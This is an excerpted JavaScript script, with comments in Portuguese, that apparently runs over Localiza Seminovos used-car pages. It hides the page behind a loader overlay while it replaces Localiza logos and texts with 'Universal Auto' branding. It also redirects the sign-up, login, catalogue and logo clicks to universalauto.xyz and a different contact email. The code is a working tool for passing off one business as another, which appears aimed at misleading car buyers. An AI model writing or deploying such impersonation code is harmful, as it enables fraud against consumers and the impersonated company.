(function universalAutoScript() {
    ...
    const LOADER_TIMEOUT_MS = 14000;   // 14 segundos
    const WHATSAPP_BASE_MESSAGE = 'Olá! Tenho interesse em um veículo.';
    const MODIFICATION_INTERVAL_MS = 100; // a cada 100ms durante o loader

    console.log('[UA] Script v46 - Loop ativo durante loader, sem redeclarações');

    // ============================================================
    // VARIÁVEIS GLOBAIS (escopo da IIFE)
    // ============================================================
    ...
    // ============================================================
    // FUNÇÃO PARA CRIAR O ELEMENTO LOADER (sobreposição)
    // ============================================================
    function createLoaderElement() {
        ...
        // Animações do carro (simplificadas para performance)
    ...
    function initLoader() {
        ...
        // Remove loader após o tempo definido
        setTimeout(() => {
    ...
    function replaceLocalizaNavbarLogo() {
        document.querySelectorAll('a[title="Seminovos Localiza"][data-testid="home-page"], a.Navbar_logoLink__6znXv').forEach(link => {
            ...
            link.addEventListener('click', (e) => { e.preventDefault(); e.stopPropagation(); window.location.href = UA_REDIRECT; });
        });
    }

    function replaceLocalizaSVGInstances() {
        document.querySelectorAll('svg[viewBox="0 0 124 33"]').forEach(svg => {
            if (svg.hasAttribute('data-ua-svg-replaced') || svg.closest('#premium-loader')) return;
            svg.setAttribute('data-ua-svg-replaced', 'true');
            const wrapper = document.createElement('div');
            wrapper.style.cssText = 'display:flex;align-items:center;gap:8px;';
            wrapper.innerHTML = `<img src="${UA_LOGO_URL}" alt="Universal Auto" style="height:33px;width:auto;object-fit:contain;display:block;"><div style="display:flex;flex-direction:column;line-height:1.15;"><span style="font-size:9px;color:#1565C0;font-weight:600;letter-spacing:2px;text-transform:uppercase;">Repasses</span><span style="font-size:15px;color:#0D3B8C;font-weight:800;letter-spacing:0.5px;">Universal Auto</span></div>`;
        ...
        document.querySelectorAll('svg[viewBox="0 0 149 39"]').forEach(svg => {
            ...
            const wrapper = document.createElement('div');
            wrapper.style.cssText = 'display:flex;align-items:center;gap:8px;';
            wrapper.innerHTML = `<img src="${UA_LOGO_URL}" alt="Universal Auto" style="height:39px;width:auto;object-fit:contain;display:block;"><div style="display:flex;flex-direction:column;line-height:1.15;"><span style="font-size:10px;color:#1565C0;font-weight:600;letter-spacing:2px;text-transform:uppercase;">Repasses</span><span style="font-size:17px;color:#0D3B8C;font-weight:800;letter-spacing:0.5px;">Universal Auto</span></div>`;
            svg.parentNode.replaceChild(wrapper, svg);
        });
    }
    ...
    function applyHero() {
        ...
        if (!hero || hero.hasAttribute('data-ua-hero')) return;
    ...
    function modifyCadastroButton() {
        ...
        heroContainer.querySelectorAll('button.LdsButton-module_lds-button--contained-primary__6r3Mk').forEach(btn => {
            if (btn.hasAttribute('data-ua-hero-done')) return;
            const span = btn.querySelector('span');
            if (!span) return;
            const texto = span.innerText.trim();
            if (texto === 'Cadastre-se agora' || texto === 'Veja o nosso catálogo') {
                span.innerText = 'Veja o nosso catálogo';
                btn.setAttribute('data-ua-hero-done', '1');
                btn.addEventListener('click', (e) => { e.preventDefault(); e.stopPropagation(); window.location.href = 'https://universalauto.xyz/carros'; });
            }
        });
    }
    ...
    function replaceCadastroParagraph() {
        document.querySelectorAll('p.LdsTypography-module_lds-typography__-DOlx.LdsTypography-module_lds-typography--body-md__KI9TK').forEach(p => {
            if (p.hasAttribute('data-ua-cadastro-paragraph')) return;
            if (p.innerText.trim() === 'Cadastre-se para acessar nossos veículos!') {
                ...
                p.setAttribute('data-ua-cadastro-paragraph', 'true');
            }
        });
    }
    ...
    function replaceMainTitle() {
        document.querySelectorAll('h1.LdsTypography-module_lds-typography__-DOlx.LdsTypography-module_lds-typography--heading-xl__xfa9y').forEach(titulo => {
            if (titulo.hasAttribute('data-ua-main-title')) return;
            if (titulo.innerText.trim() === 'Diversos modelos, com todas as vantagens Localiza!') {
                ...
                titulo.setAttribute('data-ua-main-title', 'true');
            }
        });
    }
    ...
    function modifyVerMaisCarrosButton() {
        document.querySelectorAll('button.LdsButton-module_lds-button--outlined-primary__ZxRfx').forEach(btn => {
            if (btn.hasAttribute('data-ua-ver-mais')) return;
            const span = btn.querySelector('span');
            if (span && span.innerText.trim() === 'Ver mais carros') {
                btn.setAttribute('data-ua-ver-mais', 'true');
                btn.addEventListener('click', (e) => { e.preventDefault(); e.stopPropagation(); window.location.href = 'https://universalauto.xyz/carros'; });
            }
        });
    }
    ...
    function modifyHowItWorksBackground() {
        ...
        if (section && !section.hasAttribute('data-ua-howitworks-bg')) {
            section.setAttribute('data-ua-howitworks-bg', 'true');
            section.style.setProperty('background', 'linear-gradient(135deg, rgb(37, 99, 235) 0%, rgb(30, 64, 175) 50%, rgb(30, 58, 138) 100%)', 'important');
        }
    }
    ...
    function modifySeparatorsBackground() {
        ...
        document.querySelectorAll('.HowItWorks_leftBorder__P6mDf,.HowItWorks_rightBorder__JevRe').forEach(el => {
            if (!el.hasAttribute('data-ua-sep-bg')) {
                el.setAttribute('data-ua-sep-bg', 'true');
    ...
    function replaceHowItWorksTexts() {
        ...
        steps.forEach(step => {
            document.querySelectorAll('h2.LdsTypography-module_lds-typography__-DOlx.LdsTypography-module_lds-typography--heading-md__QVgP4').forEach(h2 => {
                if (!h2.hasAttribute('data-ua-howitworks-h2') && h2.innerText.trim() === step.h2Text && h2.innerText !== step.newH2) {
                    h2.innerText = step.newH2;
                    h2.setAttribute('data-ua-howitworks-h2', 'true');
                }
            });
            document.querySelectorAll('p.LdsTypography-module_lds-typography__-DOlx.LdsTypography-module_lds-typography--body-md__KI9TK').forEach(p => {
                if (!p.hasAttribute('data-ua-howitworks-p') && p.innerText.trim() === step.pText && p.innerText !== step.newP) {
                    p.innerText = step.newP;
                    p.setAttribute('data-ua-howitworks-p', 'true');
                }
            });
        });
    }
    ...
    function modifyEquipeEspecializadaBackground() {
        ...
        if (div && !div.hasAttribute('data-ua-equipe')) {
            ...
            div.style.setProperty('background', 'linear-gradient(135deg, rgb(37, 99, 235) 0%, rgb(30, 64, 175) 50%, rgb(30, 58, 138) 100%)', 'important');
        }
    }

    function modifyFAQSection() {
        const faqDiv = document.querySelector('.FAQ_banner__7TtUF');
        if (!faqDiv || faqDiv.hasAttribute('data-ua-faq-section')) return;
        faqDiv.setAttribute('data-ua-faq-section', 'true');
    ...
    function modifyFaqCadastroButton() {
        ...
        faqButtons.querySelectorAll('button.LdsButton-module_lds-button--contained-primary__6r3Mk').forEach(btn => {
            ...
            if (span && span.innerText.trim() === 'Cadastre-se agora') {
                ...
                btn.addEventListener('click', (e) => { e.preventDefault(); e.stopPropagation(); window.location.href = 'mailto:contato@universalautorepasse.com.br'; });
            }
        });
    }
    ...
    function modifyLoginDialog() {
        ...
        if (cadastroBtn) {
            ...
            if (span && span.innerText.trim() === 'Cadastre-se') {
                ...
                cadastroBtn.addEventListener('click', (e) => { e.preventDefault(); e.stopPropagation(); window.location.href = 'https://universalauto.xyz/carros'; });
            }
        }
    }
    ...
    function modifyHowItWorksTitle() {
        ...
        if (titleElement && !titleElement.hasAttribute('data-ua-howitworks-title') && titleElement.innerHTML !== 'Como funciona? <br> Veja como é <span>rápido</span> <br> e <span>simples</span> comprar na universal.') {
            titleElement.innerHTML = 'Como funciona? <br> Veja como é <span>rápido</span> <br> e <span>simples</span> comprar na universal.';
            titleElement.setAttribute('data-ua-howitworks-title', 'true');
        }
    }
    ...
    function modifyAccordionFaq() {
        ...
        document.querySelectorAll('p.LdsTypography-module_lds-typography--body-md__KI9TK').forEach(p => {
            if (!p.hasAttribute('data-ua-faq-footer') && p.innerText.trim() === 'Os melhores preços para a sua empresa, com flexibilidade de negociação.') {
                p.innerText = 'Os melhores preços do mercado, com flexibilidade de negociação.';
                p.setAttribute('data-ua-faq-footer', 'true');
            }
        });
    }
    ...
    // ============================================================
    // LISTAGEM DE VEÍCULOS (depende de dadosCarregados)
    // ============================================================
            ...
            if (fipe.marginPercentage && fipe.marginPercentage > 0) {
                ...
                if (footerDiv) {
                    ...
                    if (priceContainer && !priceContainer.querySelector('.Price_fipeContainer__t6NfV')) {
                        const fipePercent = fipe.marginPercentage.toFixed(2).replace('.', ',');
    ...
    function applySidebar(carroData) {
        ...
        if (!container || container.hasAttribute('data-ua-sidebar-processed')) return;
        ...
        const distance = fipe.marginValue ? fipe.marginValue.toLocaleString('pt-BR', { style:'currency', currency:'BRL' }) : 'N/A';
        const marginPercent = fipe.marginPercentage ? fipe.marginPercentage.toFixed(2).replace('.', ',') + ' %' : 'N/A';
    ...
    // ============================================================
    // FUNÇÃO QUE REÚNE TODAS AS MODIFICAÇÕES
    // ============================================================
    ...
    // ============================================================
    // LOOP ATIVO DE MODIFICAÇÕES DURANTE O LOADER
    // ============================================================
    function startActiveModifications() {
        runAllModifications(); // executa imediatamente
        modificationInterval = setInterval(() => {
            if (document.getElementById('premium-loader')) {
                ...
                if (modificationInterval) {
                    clearInterval(modificationInterval);
                    modificationInterval = null;
                    console.log('[UA] Loop ativo encerrado (loader sumiu).');
                }
            }
    ...
    // ============================================================
    // MUTATION OBSERVER (leve, para mudanças futuras)
    // ============================================================
    function startMutationObserver() {
        if (globalObserver) globalObserver.disconnect();
        globalObserver = new MutationObserver(() => {
            // Após o loader, usamos debounce leve
            if (!document.getElementById('premium-loader')) {
                ...
                // Durante o loader, executa imediatamente (o loop já cuida, mas garantimos)
                runAllModifications();
            }
        });
        globalObserver.observe(document.body, { childList: true, subtree: true, attributes: true, attributeFilter: ['class', 'style'] });
    }
    ...
    initLoader();
    loadDataAsync();
    startActiveModifications();   // <-- LOOP ATIVO DURANTE O LOADER
    ...
    console.log('[UA] Script v46 inicializado. Loop ativo DURANTE o loader (100ms).');
})();